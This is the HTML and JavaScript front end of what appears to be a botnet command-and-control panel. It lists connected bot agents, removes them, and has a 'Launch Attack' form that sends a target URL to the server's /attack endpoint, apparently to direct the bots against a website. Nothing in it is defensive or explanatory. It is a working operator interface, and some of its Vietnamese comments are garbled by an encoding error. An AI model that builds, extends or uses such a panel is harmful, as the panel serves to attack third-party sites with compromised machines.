<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>C2 Control Panel</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #0d0d0d;
      color: #f5f5f5; /* chá»¯ sÃ¡ng hÆ¡n */
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    .navbar {
      margin-bottom: 20px;
      border-bottom: 1px solid #333;
    }
    .card {
      margin-bottom: 20px;
      background: linear-gradient(145deg, #1c1c1c, #111);
      border: none;
      border-radius: 16px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.6);
    }
    .card-header {
      border-bottom: 1px solid #333;
      font-weight: 600;
      font-size: 1.1rem;
      color: #fff;
    }
    pre {
      background: #111;
      color: #0f0;
      padding: 15px;
      border-radius: 12px;
      max-height: 400px;
      overflow-y: auto;
    }
    .table {
      color: #f0f0f0; /* sÃ¡ng hÆ¡n */
    }
    .badge {
      font-size: 0.85rem;
    }
    button, .btn {
      border-radius: 12px !important;
    }
    /* alert box ná»•i */
    #alert-box {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 2000;
      display: none;
    }
    /* hiá»‡u á»©ng fade-out */
    .fade-out {
      animation: fadeOut 0.8s forwards;
    }
    @keyframes fadeOut {
      from { opacity: 1; }
      to { opacity: 0; height: 0; transform: scale(0.98); }
    }
  </style>
</head>
<body>
  <nav class="navbar navbar-dark bg-black px-3">
    <span class="navbar-brand mb-0 h1">ðŸ’» C2 Control Panel
      <span id="bot-count" class="badge bg-light text-dark">0</span>
    </span>
    <div>
      <button class="btn btn-danger btn-sm me-2" onclick="stopAll()">ðŸ›‘ Stop All</button>
      <a href="/logout" class="btn btn-outline-light btn-sm">Logout</a>
    </div>
  </nav>

  <!-- alert box -->
  <div id="alert-box" class="alert alert-success text-dark fw-bold py-2 px-4 rounded shadow"></div>

  <div class="container">
    <!-- Agent list -->
    <div class="card">
      <div class="card-header">ðŸ“¡ Active Agents</div>
      <div class="card-body">
        <table class="table table-dark table-hover" id="agent-table">
          <thead>
            <tr>
              <th>Agent ID</th>
              <th>Last Seen</th>
              <th>Status</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody id="agent-list"></tbody>
        </table>
        <button class="btn btn-outline-danger" onclick="disconnectAll()">âŒ Remove All</button>
      </div>
    </div>

    <!-- Attack -->
    <div class="card">
      <div class="card-header">âš”ï¸ Attack</div>
      <div class="card-body">
        <form id="attack-form" class="d-flex gap-2">
          <input type="text" id="attack-url" name="url" class="form-control" placeholder="https://example.com" required>
          <button type="submit" class="btn btn-danger">ðŸ”¥ Launch Attack</button>
        </form>
      </div>
    </div>
  </div>

  <script>
    function showAlert(message, type="success") {
      const alertBox = document.getElementById("alert-box");
      alertBox.className = `alert alert-${type} text-dark fw-bold py-2 px-4 rounded shadow`;
      alertBox.innerText = message;
      alertBox.style.display = "block";
      setTimeout(() => {
        alertBox.style.display = "none";
      }, 3000);
    }

    async function fetchAgents() {
      const res = await fetch("/agents");
      const agents = await res.json();
      const tbody = document.getElementById("agent-list");
      tbody.innerHTML = "";
      agents.forEach(agent => {
        const tr = document.createElement("tr");
        tr.setAttribute("id", `agent-${agent.id}`);
        tr.innerHTML = `
          <td>${agent.id}</td>
          <td>${agent.last_seen}</td>
          <td>
            <span class="badge ${agent.status === 'active' ? 'bg-success' : 'bg-warning'}">
              ${agent.status}
            </span>
          </td>
          <td>
            <button class="btn btn-sm btn-danger" onclick="disconnectAgent('${agent.id}')">âŒ Remove</button>
          </td>
        `;
        tbody.appendChild(tr);
      });
      document.getElementById("bot-count").innerText = agents.filter(a => a.status === 'active').length;
    }

    async function disconnectAgent(agentId) {
      await fetch(`/disconnect/${agentId}`, { method: "POST" });
      const row = document.getElementById(`agent-${agentId}`);
      if (row) {
        row.classList.add("fade-out");
        row.addEventListener("animationend", () => row.remove());
      }
      showAlert("Agent removed successfully!");
      fetchAgents();
    }

    async function disconnectAll() {
      await fetch(`/disconnect_all`, { method: "POST" });
      const rows = document.querySelectorAll("#agent-list tr");
      rows.forEach((row, index) => {
        row.classList.add("fade-out");
        row.addEventListener("animationend", () => row.remove());
      });
      showAlert("All agents removed!");
      fetchAgents();
    }

    async function stopAll() {
      await fetch(`/stop_all`, { method: "POST" });
      showAlert("All attacks stopped!");
      fetchAgents();
    }

    document.getElementById("attack-form").addEventListener("submit", async (e) => {
      e.preventDefault();
      const url = document.getElementById("attack-url").value;
      const res = await fetch("/attack", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url })
      });
      const data = await res.json();
      showAlert("Attack launched successfully!");
      document.getElementById("attack-url").value = "";
    });

    setInterval(fetchAgents, 3000);
    fetchAgents();
  </script>
</body>
</html>